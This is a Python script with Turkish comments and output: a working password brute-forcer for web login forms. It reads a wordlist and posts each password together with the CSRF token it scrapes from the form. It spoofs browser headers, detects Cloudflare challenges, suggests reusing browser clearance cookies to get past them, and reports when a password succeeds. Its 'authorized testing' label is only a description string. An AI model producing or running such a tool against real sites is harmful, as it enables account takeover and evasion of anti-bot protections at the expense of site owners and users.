import argparse, time, sys, re
from typing import Optional, Dict
import requests
from bs4 import BeautifulSoup

def parse_cookie_string(cookie_str: str) -> Dict[str, str]:
    jar = {}
    for pair in cookie_str.split(";"):
        pair = pair.strip()
        if not pair:
            continue
        if "=" in pair:
            k, v = pair.split("=", 1)
            jar[k.strip()] = v.strip()
    return jar

def get_csrf(html: str, name: str) -> Optional[str]:
    soup = BeautifulSoup(html, "html.parser")

    tag = soup.find("input", {"name": name})
    if tag and tag.get("value"):
        return tag["value"]
  
    meta = soup.find("meta", {"name": name})
    if meta and meta.get("content"):
        return meta["content"]
    return None

def looks_like_cloudflare(resp: requests.Response) -> bool:
   
    txt = resp.text.lower()
    return ("cloudflare" in txt and ("checking your browser" in txt or "attention required" in txt)) or \
           ("cf-appeal" in txt) or ("Verify you are human".lower() in txt)

def success_check(resp: requests.Response, success_url_part: str, success_text: Optional[str]) -> bool:
 
    if success_url_part and success_url_part in resp.url:
        return True
   
    if "Location" in resp.headers and success_url_part and success_url_part in resp.headers.get("Location", ""):
        return True
   
    if success_text and success_text in resp.text:
        return True
    return False

def try_once(session: requests.Session, url: str, username: str, password: str,
             csrf_name: str, success_url_part: str, success_text: Optional[str],
             verbose: bool) -> str:

    r1 = session.get(url, allow_redirects=True, timeout=20)
    if verbose:
        print(f"↪ GET {url} → {r1.status_code}")
    if looks_like_cloudflare(r1):
        return "cloudflare"

    csrf = get_csrf(r1.text, csrf_name) if csrf_name else None
    if csrf_name and not csrf:
        if verbose:
            print("CSRF token bulunamadı (form alanı adı doğru mu?).")
       
   
    data = {
        "username": username,
        "password": password,
    }
    if csrf_name and csrf:
        data[csrf_name] = csrf

    r2 = session.post(url, data=data, allow_redirects=True, timeout=25)
    if verbose:
        print(f"Deneniyor: {password}")
    if looks_like_cloudflare(r2):
        return "cloudflare"

    if success_check(r2, success_url_part, success_text):
        return "ok"
    return "fail"

def main():
    ap = argparse.ArgumentParser(description="Yetkili ortamda wordlist ile login denemesi (eğitim/güvenlik testi).")
    ap.add_argument("--url", required=False, default="https://site123.com/login/", help="Login formu URL")
    ap.add_argument("--user", required=True, help="Kullanıcı adı")
    ap.add_argument("-P", "--passwords", required=True, help="Wordlist dosyası")
    ap.add_argument("--csrf-name", default="csrf_token", help="CSRF input name (varsayılan: csrf_token)")
    ap.add_argument("--success-url", default="/profile/", help="Başarı URL parçası (varsayılan: /profile/)")
    ap.add_argument("--success-text", default=None, help="Başarı metni (opsiyonel)")
    ap.add_argument("--delay", type=float, default=0.6, help="Denemeler arası bekleme (saniye)")
    ap.add_argument("--cookie", default=None, help='Cookie string: cf_clearance=...; PHPSESSID=...')
    ap.add_argument("--quiet", action="store_true", help="Denemeleri tek tek yazma")
    args = ap.parse_args()

    sess = requests.Session()

    sess.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Referer": args.url,
        "Origin": re.match(r"https?://[^/]+", args.url).group(0) if re.match(r"https?://[^/]+", args.url) else args.url,
    })

    if args.cookie:
        for k, v in parse_cookie_string(args.cookie).items():
            sess.cookies.set(k, v)

    # Wordlist oku
    try:
        with open(args.passwords, "r", encoding="utf-8", errors="ignore") as f:
            candidates = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist bulunamadı: {args.passwords}")
        sys.exit(1)

    for pw in candidates:
        status = try_once(
            sess, args.url, args.user, pw,
            csrf_name=args.csrf_name,
            success_url_part=args.success_url,
            success_text=args.success_text,
            verbose=not args.quiet
        )
        if status == "ok":
            print(f" Şifre bulundu: {pw}")
            return
        elif status == "cloudflare":
            print(" Cloudflare/anti-bot engeli görünüyor. Gerekirse tarayıcıdan aldığın çerezleri --cookie ile ekle.")
          
            time.sleep(max(args.delay, 1.5))
        else:
            if not args.quiet:
                print(f"❌ Başarısız: {pw}")
        time.sleep(args.delay)
    print("🔚 Wordlist bitti, eşleşme yok.")

if __name__ == "__main__":
   
    main()
